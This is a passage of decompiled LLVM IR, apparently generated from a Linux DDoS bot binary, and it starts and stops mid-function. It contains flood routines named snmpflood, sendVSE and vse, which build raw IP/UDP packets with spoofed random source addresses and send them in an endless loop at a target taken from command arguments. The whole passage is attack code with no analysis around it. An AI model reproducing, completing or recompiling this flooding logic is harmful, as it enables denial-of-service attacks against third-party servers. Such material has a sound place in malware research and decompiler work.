  store i32 %v2_804aa47, i32* %ecx.global-to-local, align 4
  store i32 %v1_804aa6e, i32* %edx.global-to-local, align 4
  store i32 %v3_804aa81, i32* %eax.global-to-local, align 4
  %v0_804aaf7 = load i32, i32* @esp, align 4
  %v2_804aafa = add i32 %v0_804aaf7, -16
  %v3_804aafa = inttoptr i32 %v2_804aafa to i32*
  store i32 %v3_804aa81, i32* %v3_804aafa, align 4
  %v0_804aafb = call i32 @snmpflood()
  %v0_804ab00 = load i32, i32* @esp, align 4
  %v1_804ab00 = add i32 %v0_804ab00, 16
  %v4_804ab03 = add nuw nsw i32 %storemerge462, 1
  store i32 %v4_804ab03, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804ab03, %v2_804a807
  br i1 %exitcond, label %dec_label_pc_804ab12, label %dec_label_pc_804aa68

dec_label_pc_804ab12:                             ; preds = %dec_label_pc_804aa68, %dec_label_pc_804a9e6
  %v0_804ab22.lcssa = phi i32 [ %v2_804aa36, %dec_label_pc_804a9e6 ], [ %v1_804ab00, %dec_label_pc_804aa68 ]
  %storemerge4.lcssa = phi i32 [ 0, %dec_label_pc_804a9e6 ], [ %v2_804a807, %dec_label_pc_804aa68 ]
  %v1_804ab15 = add i32 %arg4, 8
  store i32 %v1_804ab15, i32* %eax.global-to-local, align 4
  %v1_804ab18 = inttoptr i32 %v1_804ab15 to i32*
  %v2_804ab18 = load i32, i32* %v1_804ab18, align 4
  store i32 %v2_804ab18, i32* %edx.global-to-local, align 4
  store i32 %v1_804aa00, i32* %eax.global-to-local, align 4
  %v2_804ab20 = load i32, i32* %v1_804aa03, align 4
  store i32 %v2_804ab20, i32* %eax.global-to-local, align 4
  %v2_804ab25 = add i32 %v0_804ab22.lcssa, -16
  %v3_804ab25 = inttoptr i32 %v2_804ab25 to i32*
  store i32 %v2_804ab18, i32* %v3_804ab25, align 4
  %v0_804ab26 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab26 = add i32 %v0_804ab22.lcssa, -20
  %v3_804ab26 = inttoptr i32 %v2_804ab26 to i32*
  store i32 %v0_804ab26, i32* %v3_804ab26, align 4
  %v5_804ab27 = add i32 %v0_804ab22.lcssa, -24
  %v6_804ab27 = inttoptr i32 %v5_804ab27 to i32*
  store i32 %arg2, i32* %v6_804ab27, align 4
  %v1_804ab2a = add i32 %v0_804ab22.lcssa, -28
  %v2_804ab2a = inttoptr i32 %v1_804ab2a to i32*
  store i32 ptrtoint ([37 x i8]* @global_var_8069048.94 to i32), i32* %v2_804ab2a, align 4
  %v5_804ab2f = add i32 %v0_804ab22.lcssa, -32
  %v6_804ab2f = inttoptr i32 %v5_804ab2f to i32*
  store i32 %arg1, i32* %v6_804ab2f, align 4
  %v2_804ab32 = call i32 @Send(i32 %storemerge4.lcssa, i32 128)
  store i32 %v2_804ab32, i32* %eax.global-to-local, align 4
  %v0_804ab37 = load i32, i32* @esp, align 4
  %v1_804ab37 = add i32 %v0_804ab37, 32
  %v1_804abf3 = add i32 %arg4, 24
  %v1_804abf6 = inttoptr i32 %v1_804abf3 to i32*
  br label %dec_label_pc_804abf0

dec_label_pc_804ab46:                             ; preds = %dec_label_pc_804abf0
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804ab74 = inttoptr i32 %v0_804ac01 to i32*
  store i32 50000, i32* %v3_804ab74, align 4
  %v1_804ab75 = sext i32 %storemerge to i64
  %v2_804ab75 = call i32 @usleep(i64 %v1_804ab75)
  %v0_804ab7a = load i32, i32* @esp, align 4
  %v1_804ab7a = add i32 %v0_804ab7a, 16
  %v0_804ab7d = load i64, i64* @global_var_807d500.88, align 8
  %sext = mul i64 %v0_804ab7d, 4294967296
  %v2_804ab86 = sdiv i64 %sext, 4294967296
  %v4_804ab86 = mul nsw i64 %v2_804ab86, 20
  %v5_804ab86 = trunc i64 %v4_804ab86 to i32
  store i32 %v5_804ab86, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804ab86, %v2_804a81e
  %v0_804abb5 = load i32, i32* @global_var_807d3c8.89, align 8
  store i32 %v0_804abb5, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804ab90, label %dec_label_pc_804abb5

dec_label_pc_804ab90:                             ; preds = %dec_label_pc_804ab46
  %tmp54 = icmp slt i32 %v0_804abb5, 1
  %tmp55 = icmp eq i1 %tmp54, false
  br i1 %tmp55, label %dec_label_pc_804aba8, label %dec_label_pc_804ab99

dec_label_pc_804ab99:                             ; preds = %dec_label_pc_804ab90
  %v0_804ab99 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804ab9e = add i32 %v0_804ab99, 100
  store i32 %v1_804ab9e, i32* %eax.global-to-local, align 4
  store i32 %v1_804ab9e, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804abe3

dec_label_pc_804aba8:                             ; preds = %dec_label_pc_804ab90
  %v1_804abad = add i32 %v0_804abb5, -1
  store i32 %v1_804abad, i32* %eax.global-to-local, align 4
  store i32 %v1_804abad, i32* @global_var_807d3c8.89, align 8
  br label %dec_label_pc_804abe3

dec_label_pc_804abb5:                             ; preds = %dec_label_pc_804ab46
  %v1_804abba = add i32 %v0_804abb5, 1
  store i32 %v1_804abba, i32* @global_var_807d3c8.89, align 8
  %v0_804abc0 = load i32, i32* @global_var_806ffa8.90, align 8
  store i32 %v0_804abc0, i32* %eax.global-to-local, align 4
  %v1_804abc5 = add i32 %v0_804abc0, -25
  %v5_804abc5 = icmp ult i32 %v0_804abc0, 25
  %v9_804abc5 = icmp eq i32 %v1_804abc5, 0
  %v2_804abc8 = or i1 %v5_804abc5, %v9_804abc5
  br i1 %v2_804abc8, label %dec_label_pc_804abd9, label %dec_label_pc_804abca

dec_label_pc_804abca:                             ; preds = %dec_label_pc_804abb5
  store i32 %v1_804abc5, i32* %eax.global-to-local, align 4
  store i32 %v1_804abc5, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804abe3

dec_label_pc_804abd9:                             ; preds = %dec_label_pc_804abb5
  store i32 0, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804abe3

dec_label_pc_804abe3:                             ; preds = %dec_label_pc_804abca, %dec_label_pc_804aba8, %dec_label_pc_804ab99, %dec_label_pc_804abd9
  store i64 0, i64* @global_var_807d500.88, align 256
  %v4_804abed = add i32 %storemerge, 1
  br label %dec_label_pc_804abf0

dec_label_pc_804abf0:                             ; preds = %dec_label_pc_804ab12, %dec_label_pc_804abe3
  %v0_804abf8 = phi i32 [ %v1_804ab7a, %dec_label_pc_804abe3 ], [ %v1_804ab37, %dec_label_pc_804ab12 ]
  %storemerge = phi i32 [ %v4_804abed, %dec_label_pc_804abe3 ], [ 0, %dec_label_pc_804ab12 ]
  store i32 %v1_804abf3, i32* %eax.global-to-local, align 4
  %v2_804abf6 = load i32, i32* %v1_804abf6, align 4
  store i32 %v2_804abf6, i32* %eax.global-to-local, align 4
  %v2_804abfb = add i32 %v0_804abf8, -16
  %v3_804abfb = inttoptr i32 %v2_804abfb to i32*
  store i32 %v2_804abf6, i32* %v3_804abfb, align 4
  %v1_804abfc = call i32 @atol(i32 %storemerge)
  %v0_804ac01 = load i32, i32* @esp, align 4
  %v9_804ac04 = mul i32 %v1_804abfc, 20
  store i32 %v9_804ac04, i32* %eax.global-to-local, align 4
  %v8_804ac0b = icmp sgt i32 %v9_804ac04, %storemerge
  br i1 %v8_804ac0b, label %dec_label_pc_804ab46, label %dec_label_pc_804ac11

dec_label_pc_804ac11:                             ; preds = %dec_label_pc_804abf0, %dec_label_pc_804a70c, %entry
  %v0_804ac1e = phi i32 [ %v1_804a738, %dec_label_pc_804a70c ], [ %v1_804a6af, %entry ], [ %v9_804ac04, %dec_label_pc_804abf0 ]
  ret i32 %v0_804ac1e

; uselistorder directives
  uselistorder i32 %v9_804ac04, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 2, 3, 1, 0 }
  uselistorder i32 %v1_804abc5, { 1, 0, 2 }
  uselistorder i32 %v0_804abb5, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804abf3, { 1, 0 }
  uselistorder i32 %v2_804aa7c, { 0, 2, 1 }
  uselistorder i32 %storemerge462, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804aa47, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a940, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a92f, { 1, 0 }
  uselistorder i32 %v2_804a95b, { 2, 1, 3, 4, 5, 0, 9, 8, 7, 6, 10 }
  uselistorder i32 %v2_804a807, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_804a7f6, { 9, 5, 4, 6, 1, 3, 2, 0, 7, 8 }
  uselistorder i32 %v2_804a7dc, { 2, 1, 0 }
  uselistorder i32 %v4_804a740, { 1, 0 }
  uselistorder i32 %v4_804a6e6, { 1, 0 }
  uselistorder i32* %stack_var_-1148, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 0, 1, 3, 4, 2, 5, 9, 10, 11, 12, 13, 15, 14, 62, 16, 17, 18, 37, 19, 20, 21, 22, 24, 25, 26, 27, 28, 23, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804abf0, { 1, 0 }
  uselistorder label %dec_label_pc_804abe3, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a9c7, { 1, 0 }
  uselistorder label %dec_label_pc_804a70c, { 1, 0 }
  uselistorder label %dec_label_pc_804a6e6, { 1, 0 }
}

define i32 @sendVSE() local_unnamed_addr {
entry:
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %v2_804ac2f = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804ac3b = add i32 %v2_804ac2f, 20
  store i32 2, i32* %stack_var_-4140, align 4
  %v1_804ac52 = call i32 @htons(i32 17015)
  %v1_804ac67 = call i32 @inet_addr(i32 %tmp14)
  %v3_804ac7e = call i32 @socket(i32 2, i32 3, i32 17)
  %v5_804ac89 = icmp slt i32 %v3_804ac7e, 0
  %v1_804ac8d = icmp eq i1 %v5_804ac89, false
  br i1 %v1_804ac8d, label %dec_label_pc_804ac99, label %dec_label_pc_804ac8f

dec_label_pc_804ac8f:                             ; preds = %entry
  %v1_804ac94 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804ac99

dec_label_pc_804ac99:                             ; preds = %entry, %dec_label_pc_804ac8f
  %v3_804acad = bitcast i32* %stack_var_-4124 to i8*
  %v4_804acad = call i32 @__GI_memset(i8* %v3_804acad, i32 0, i32 4096)
  store i32 %v4_804acad, i32* @eax, align 4
  %v2_804acbb = call i32 @setup_ip_header(i8* %v3_804acad)
  store i32 %v2_804acbb, i32* @eax, align 4
  %v1_804acc6 = call i32 @setup_udp_header(i32 %v1_804ac3b)
  %v2_804acd7 = add i32 %v2_804ac2f, 16
  %v3_804acd7 = inttoptr i32 %v2_804acd7 to i32*
  store i32 %v1_804ac67, i32* %v3_804acd7, align 4
  %v1_804acdd = or i32 %v2_804ac2f, 2
  %v2_804acdd = inttoptr i32 %v1_804acdd to i16*
  %v3_804acdd = load i16, i16* %v2_804acdd, align 2
  %v4_804acdd = zext i16 %v3_804acdd to i32
  %v2_804acee = bitcast i32* %stack_var_-4124 to i16*
  %v3_804acee = call i32 @csum(i16* %v2_804acee, i32 %v4_804acdd)
  %v4_804acee = trunc i32 %v3_804acee to i16
  %v3_804acfb = add i32 %v2_804ac2f, 10
  %v4_804acfb = inttoptr i32 %v3_804acfb to i16*
  store i16 %v4_804acee, i16* %v4_804acfb, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804ad09 = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v3_804ac7e, i32* %stack_var_-4188, align 4
  %v5_804ad21 = call i32 @__GI_setsockopt(i32 %v3_804ac7e, i32 0, i32 3, i32 %v2_804ad09, i32 4)
  %v2_804ad29 = icmp slt i32 %v5_804ad21, 0
  %v1_804ad2b = icmp eq i1 %v2_804ad29, false
  br i1 %v1_804ad2b, label %dec_label_pc_804ad37, label %dec_label_pc_804ad2d

dec_label_pc_804ad2d:                             ; preds = %dec_label_pc_804ac99
  %v1_804ad32 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804ad37

dec_label_pc_804ad37:                             ; preds = %dec_label_pc_804ac99, %dec_label_pc_804ad2d
  %v2_804ad3c = call i32 @__GI_time(i32* null)
  %v1_804ad45 = call i32 @init_rand(i32 %v2_804ad3c)
  %v2_804ad4d = ptrtoint i32* %stack_var_-4140 to i32
  %v2_804adc1 = add i32 %v2_804ac2f, 12
  %v3_804adc1 = inttoptr i32 %v2_804adc1 to i32*
  %v3_804adda = add i32 %v2_804ac2f, 4
  %v4_804adda = inttoptr i32 %v3_804adda to i16*
  br label %dec_label_pc_804ad4d

dec_label_pc_804ad4d:                             ; preds = %dec_label_pc_804ad4d, %dec_label_pc_804ad37
  %v3_804ad56 = load i16, i16* %v2_804acdd, align 2
  %v4_804ad56 = zext i16 %v3_804ad56 to i32
  store i32 %v3_804ac7e, i32* %stack_var_-4188, align 4
  %v6_804ad72 = call i32 @sendto(i32 %v3_804ac7e, i32 %v2_804ac2f, i32 %v4_804ad56, i32 0, i32 %v2_804ad4d, i32 16)
  %v1_804ad7a = call i32 @rand_cmwc(i32 %v3_804ac7e)
  %v2_804ad7f = urem i32 %v1_804ad7a, 16777216
  %v2_804ad89 = sub i32 %v1_804ad7a, %v2_804ad7f
  store i32 %v2_804ad89, i32* @ebx, align 4
  %v1_804ad8c = call i32 @rand_cmwc(i32 %v3_804ac7e)
  %sext = mul i32 %v1_804ad8c, 65536
  %v1_804ad91 = sdiv i32 %sext, 65536
  %v1_804ad94 = and i32 %v1_804ad91, 16711680
  %v0_804ad9c = load i32, i32* @ebx, align 4
  %v2_804ad9c = or i32 %v1_804ad94, %v0_804ad9c
  store i32 %v2_804ad9c, i32* @ebx, align 4
  %v0_804ad9e = load i32, i32* %stack_var_-4188, align 4
  %v1_804ad9e = call i32 @rand_cmwc(i32 %v0_804ad9e)
  %sext1 = mul i32 %v1_804ad9e, 16777216
  %v1_804ada3 = sdiv i32 %sext1, 16777216
  %v1_804ada6 = and i32 %v1_804ada3, 65280
  %v0_804adae = load i32, i32* @ebx, align 4
  %v2_804adae = or i32 %v1_804ada6, %v0_804adae
  store i32 %v2_804adae, i32* @ebx, align 4
  %v0_804adb0 = load i32, i32* %stack_var_-4188, align 4
  %v1_804adb0 = call i32 @rand_cmwc(i32 %v0_804adb0)
  %v1_804adb5 = urem i32 %v1_804adb0, 256
  %v0_804adba = load i32, i32* @ebx, align 4
  %v2_804adbc = or i32 %v0_804adba, %v1_804adb5
  store i32 %v2_804adbc, i32* %v3_804adc1, align 4
  %v0_804adc4 = load i32, i32* %stack_var_-4188, align 4
  %v1_804adc4 = call i32 @rand_cmwc(i32 %v0_804adc4)
  %v1_804adcd = call i32 @htonl(i32 %v1_804adc4)
  %v2_804adcd = trunc i32 %v1_804adcd to i16
  store i16 %v2_804adcd, i16* %v4_804adda, align 4
  %v3_804ade1 = load i16, i16* %v2_804acdd, align 2
  %v4_804ade1 = zext i16 %v3_804ade1 to i32
  %v3_804adf2 = call i32 @csum(i16* %v2_804acee, i32 %v4_804ade1)
  %v4_804adf2 = trunc i32 %v3_804adf2 to i16
  store i16 %v4_804adf2, i16* %v4_804acfb, align 2
  br label %dec_label_pc_804ad4d

; uselistorder directives
  uselistorder i32 %v3_804ac7e, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804ac2f, { 0, 2, 3, 4, 1, 5, 6 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32* %stack_var_-4188, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4140, { 1, 0 }
  uselistorder label %dec_label_pc_804ad37, { 1, 0 }
  uselistorder label %dec_label_pc_804ac99, { 1, 0 }
}

define i32 @vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-2668 = alloca i32, align 4
  %stack_var_-2636 = alloca i32, align 4
  %v15_804ae0c = ptrtoint i32* %stack_var_-2636 to i32
  store i32 %v15_804ae0c, i32* @eax, align 4
  %v1_804ae20 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v1_804ae28 = icmp eq i32 %v1_804ae20, 0
  %v1_804ae2a = icmp eq i1 %v1_804ae28, false
  br i1 %v1_804ae2a, label %dec_label_pc_804b1b3, label %dec_label_pc_804ae30

dec_label_pc_804ae30:                             ; preds = %entry
  %v3_804ae3c = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804ae3c, i32* %eax.global-to-local, align 4
  %v5_804ae47 = icmp slt i32 %v3_804ae3c, 0
  %v1_804ae4b = icmp eq i1 %v5_804ae47, false
  br i1 %v1_804ae4b, label %dec_label_pc_804ae57, label %dec_label_pc_804ae4d

dec_label_pc_804ae4d:                             ; preds = %dec_label_pc_804ae30
  %v1_804ae52 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804ae52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae57

dec_label_pc_804ae57:                             ; preds = %dec_label_pc_804ae30, %dec_label_pc_804ae4d
  %v4_804ae57 = add i32 %arg3, -3
  %v9_804ae57 = sub i32 2, %arg3
  %v10_804ae57 = and i32 %v9_804ae57, %arg3
  %v11_804ae57 = icmp slt i32 %v10_804ae57, 0
  %v12_804ae57 = icmp eq i32 %v4_804ae57, 0
  %v13_804ae57 = icmp slt i32 %v4_804ae57, 0
  %v3_804ae5b = icmp eq i1 %v13_804ae57, %v11_804ae57
  %v4_804ae5b = icmp eq i1 %v12_804ae57, false
  %v5_804ae5b = and i1 %v4_804ae5b, %v3_804ae5b
  br i1 %v5_804ae5b, label %dec_label_pc_804ae7d, label %dec_label_pc_804ae5d

dec_label_pc_804ae5d:                             ; preds = %dec_label_pc_804ae57
  store i32 %arg1, i32* %stack_var_-2668, align 4
  %v3_804ae6b = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_8069070.95 to i32))
  store i32 %v3_804ae6b, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-2668, align 4
  %v1_804ae78 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804ae78, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae7d

dec_label_pc_804ae7d:                             ; preds = %dec_label_pc_804ae57, %dec_label_pc_804ae5d
  %v1_804ae80 = add i32 %arg4, 12
  store i32 %v1_804ae80, i32* %eax.global-to-local, align 4
  %v1_804ae83 = inttoptr i32 %v1_804ae80 to i32*
  %v2_804ae83 = load i32, i32* %v1_804ae83, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804ae90 = and i32 %v2_804ae83, -256
  store i32 %v1_804ae90, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804ae93 = inttoptr i32 %v2_804ae83 to i8*
  store i32 %v2_804ae83, i32* @edi, align 4
  %v3_804ae99 = call i32 @_strlen(i8* %v4_804ae93)
  %v4_804ae99 = mul i32 %v3_804ae99, -1
  %v5_804ae99 = add i32 %v4_804ae99, -2
  store i32 %v5_804ae99, i32* %ecx.global-to-local, align 4
  %v1_804ae9f = sub i32 0, %v4_804ae99
  store i32 %v1_804ae9f, i32* %edx.global-to-local, align 4
  %v2_804aea7 = mul i32 %v3_804ae99, 5
  %v1_804aea9 = add i32 %v2_804aea7, 160
  store i32 %v1_804aea9, i32* %eax.global-to-local, align 4
  %v4_804aeb1 = add i32 %v2_804aea7, -863
  %v9_804aeb1 = sub i32 862, %v2_804aea7
  %v10_804aeb1 = and i32 %v9_804aeb1, %v1_804aea9
  %v11_804aeb1 = icmp slt i32 %v10_804aeb1, 0
  %v12_804aeb1 = icmp eq i32 %v4_804aeb1, 0
  %v13_804aeb1 = icmp slt i32 %v4_804aeb1, 0
  %v3_804aeb8 = icmp eq i1 %v13_804aeb1, %v11_804aeb1
  %v4_804aeb8 = icmp eq i1 %v12_804aeb1, false
  %v5_804aeb8 = and i1 %v4_804aeb8, %v3_804aeb8
  br i1 %v5_804aeb8, label %dec_label_pc_804b1b3, label %dec_label_pc_804aebe

dec_label_pc_804aebe:                             ; preds = %dec_label_pc_804ae7d
  %v2_804aec3 = call i32 @__GI_time(i32* null)
  store i32 %v2_804aec3, i32* %eax.global-to-local, align 4
  %v12_804aec8 = ptrtoint i32* %stack_var_-2668 to i32
  %v1_804aecf = call i32 @srand(i32 %v2_804aec3)
  store i32 0, i32* @global_var_807e520.80, align 32
  store i32 128, i32* %eax.global-to-local, align 4
  %v1_804aef6 = call i32 @malloc(i32 128)
  store i32 %v1_804aef6, i32* @edx, align 4
  %v1_804af07 = inttoptr i32 %v1_804aef6 to i8*
  store i32 %v1_804aef6, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804af0e = call i8* @_memset(i8* %v1_804af07, i32 0, i32 128)
  %v6_804af0e = ptrtoint i8* %v5_804af0e to i32
  store i32 %v6_804af0e, i32* %ecx.global-to-local, align 4
  %v1_804af18 = add i32 %arg4, 4
  store i32 %v1_804af18, i32* %eax.global-to-local, align 4
  %v1_804af1b = inttoptr i32 %v1_804af18 to i32*
  %v2_804af1b = load i32, i32* %v1_804af1b, align 4
  store i32 %v2_804af1b, i32* %eax.global-to-local, align 4
  %v2_804af24 = call i32 @host2ip(i32 %arg2, i32 %v2_804af1b)
  %v1_804af32 = add i32 %arg4, 8
  store i32 %v1_804af32, i32* %eax.global-to-local, align 4
  %v1_804af35 = inttoptr i32 %v1_804af32 to i32*
  %v2_804af35 = load i32, i32* %v1_804af35, align 4
  store i32 %v2_804af35, i32* %eax.global-to-local, align 4
  %v1_804af3b = call i32 @atol(i32 %v2_804af35)
  store i32 %v1_804ae80, i32* %eax.global-to-local, align 4
  %v2_804af4c = load i32, i32* %v1_804ae83, align 4
  store i32 %v2_804af4c, i32* %eax.global-to-local, align 4
  %v1_804af52 = call i32 @atol(i32 %v2_804af4c)
  %v1_804af60 = add i32 %arg4, 16
  store i32 %v1_804af60, i32* %eax.global-to-local, align 4
  %v1_804af63 = inttoptr i32 %v1_804af60 to i32*
  %v2_804af63 = load i32, i32* %v1_804af63, align 4
  store i32 %v2_804af63, i32* %eax.global-to-local, align 4
  %v1_804af69 = call i32 @atol(i32 %v2_804af63)
  %v1_804af77 = add i32 %arg4, 20
  store i32 %v1_804af77, i32* %eax.global-to-local, align 4
  %v1_804af7a = inttoptr i32 %v1_804af77 to i32*
  %v2_804af7a = load i32, i32* %v1_804af7a, align 4
  store i32 %v2_804af7a, i32* %eax.global-to-local, align 4
  %v1_804af80 = call i32 @atol(i32 %v2_804af7a)
  store i32 0, i32* @global_var_807d3c8.89, align 8
  store i64 0, i64* @global_var_807d500.88, align 256
  store i32 %v1_804af18, i32* %eax.global-to-local, align 4
  %v2_804afbe = load i32, i32* %v1_804af1b, align 4
  store i32 %v2_804afbe, i32* %eax.global-to-local, align 4
  %v1_804afc4 = call i32 @inet_addr(i32 %v2_804afbe)
  %v1_804afd5 = mul i32 %v1_804af52, 4
  store i32 %v1_804afd5, i32* %edx.global-to-local, align 4
  %v2_804afe3 = mul i32 %v1_804af52, 28
  %v1_804afe8 = add i32 %v2_804afe3, 30
  %v2_804afeb = and i32 %v1_804afe8, -16
  %v2_804aff1 = sub i32 %v12_804aec8, %v2_804afeb
  %v1_804afff = add i32 %v2_804aff1, 15
  %v2_804b002 = and i32 %v1_804afff, -16
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b0a453 = icmp sgt i32 %v1_804af52, 0
  br i1 %v5_804b0a453, label %dec_label_pc_804b020.lr.ph, label %dec_label_pc_804b0aa

dec_label_pc_804b020.lr.ph:                       ; preds = %dec_label_pc_804aebe
  %v3_804b054 = or i32 %v2_804b002, 8
  br label %dec_label_pc_804b020

dec_label_pc_804b020:                             ; preds = %dec_label_pc_804b020, %dec_label_pc_804b020.lr.ph
  %storemerge354 = phi i32 [ 0, %dec_label_pc_804b020.lr.ph ], [ %v4_804b09b, %dec_label_pc_804b020 ]
  %v1_804b026 = mul i32 %storemerge354, 4
  %v2_804b034 = mul i32 %storemerge354, 28
  %v3_804b039 = add i32 %v2_804b034, %v2_804b002
  %v4_804b039 = inttoptr i32 %v3_804b039 to i32*
  store i32 %storemerge354, i32* %v4_804b039, align 4
  store i32 %v2_804b002, i32* %ecx.global-to-local, align 4
  store i32 %v2_804b034, i32* %edx.global-to-local, align 4
  %v4_804b054 = add i32 %v3_804b054, %v2_804b034
  %v5_804b054 = inttoptr i32 %v4_804b054 to i32*
  store i32 2, i32* %v5_804b054, align 4
  %v1_804b05e = load i32, i32* %edx.global-to-local, align 4
  %v2_804b05e = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b05e = add i32 %v1_804b05e, 12
  %v4_804b05e = add i32 %v3_804b05e, %v2_804b05e
  %v5_804b05e = inttoptr i32 %v4_804b05e to i32*
  store i32 %v1_804afc4, i32* %v5_804b05e, align 4
  %v1_804b068 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b068 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b068 = add i32 %v1_804b068, 16
  %v4_804b068 = add i32 %v3_804b068, %v2_804b068
  %v5_804b068 = inttoptr i32 %v4_804b068 to i32*
  %v1_804b072 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b072 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b072 = add i32 %v1_804b072, 20
  %v4_804b072 = add i32 %v3_804b072, %v2_804b072
  %v5_804b072 = inttoptr i32 %v4_804b072 to i32*
  store i32 %v2_804b002, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b026, i32* %edx.global-to-local, align 4
  store i32 %v3_804b039, i32* %eax.global-to-local, align 4
  %v0_804b08f = load i32, i32* @esp, align 4
  %v2_804b092 = add i32 %v0_804b08f, -16
  %v3_804b092 = inttoptr i32 %v2_804b092 to i32*
  store i32 %v3_804b039, i32* %v3_804b092, align 4
  %v0_804b093 = call i32 @sendVSE()
  %v0_804b098 = load i32, i32* @esp, align 4
  %v1_804b098 = add i32 %v0_804b098, 16
  %v4_804b09b = add nuw nsw i32 %storemerge354, 1
  store i32 %v4_804b09b, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b09b, %v1_804af52
  br i1 %exitcond, label %dec_label_pc_804b0aa, label %dec_label_pc_804b020

dec_label_pc_804b0aa:                             ; preds = %dec_label_pc_804b020, %dec_label_pc_804aebe
  %v0_804b0ba.lcssa = phi i32 [ %v2_804aff1, %dec_label_pc_804aebe ], [ %v1_804b098, %dec_label_pc_804b020 ]
  %storemerge3.lcssa = phi i32 [ 0, %dec_label_pc_804aebe ], [ %v1_804af52, %dec_label_pc_804b020 ]
  store i32 %v1_804af32, i32* %eax.global-to-local, align 4
  %v2_804b0b0 = load i32, i32* %v1_804af35, align 4
  store i32 %v2_804b0b0, i32* %edx.global-to-local, align 4
  store i32 %v1_804af18, i32* %eax.global-to-local, align 4
  %v2_804b0b8 = load i32, i32* %v1_804af1b, align 4
  store i32 %v2_804b0b8, i32* %eax.global-to-local, align 4
  %v2_804b0bd = add i32 %v0_804b0ba.lcssa, -16
  %v3_804b0bd = inttoptr i32 %v2_804b0bd to i32*
  store i32 %v2_804b0b0, i32* %v3_804b0bd, align 4
  %v0_804b0be = load i32, i32* %eax.global-to-local, align 4
  %v2_804b0be = add i32 %v0_804b0ba.lcssa, -20
  %v3_804b0be = inttoptr i32 %v2_804b0be to i32*
  store i32 %v0_804b0be, i32* %v3_804b0be, align 4
  %v5_804b0bf = add i32 %v0_804b0ba.lcssa, -24
  %v6_804b0bf = inttoptr i32 %v5_804b0bf to i32*
  store i32 %arg2, i32* %v6_804b0bf, align 4
  %v1_804b0c2 = add i32 %v0_804b0ba.lcssa, -28
  %v2_804b0c2 = inttoptr i32 %v1_804b0c2 to i32*
  store i32 ptrtoint ([32 x i8]* @global_var_80690cc.96 to i32), i32* %v2_804b0c2, align 4
  %v5_804b0c7 = add i32 %v0_804b0ba.lcssa, -32
  %v6_804b0c7 = inttoptr i32 %v5_804b0c7 to i32*
  store i32 %arg1, i32* %v6_804b0c7, align 4
  %v2_804b0ca = call i32 @Send(i32 %storemerge3.lcssa, i32 128)
  store i32 %v2_804b0ca, i32* %eax.global-to-local, align 4
  %v0_804b0cf = load i32, i32* @esp, align 4
  %v1_804b0cf = add i32 %v0_804b0cf, 32
  %v1_804b18b = add i32 %arg4, 24
  %v1_804b18e = inttoptr i32 %v1_804b18b to i32*
  br label %dec_label_pc_804b188

dec_label_pc_804b0de:                             ; preds = %dec_label_pc_804b188
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804b10c = inttoptr i32 %v0_804b199 to i32*
  store i32 50000, i32* %v3_804b10c, align 4
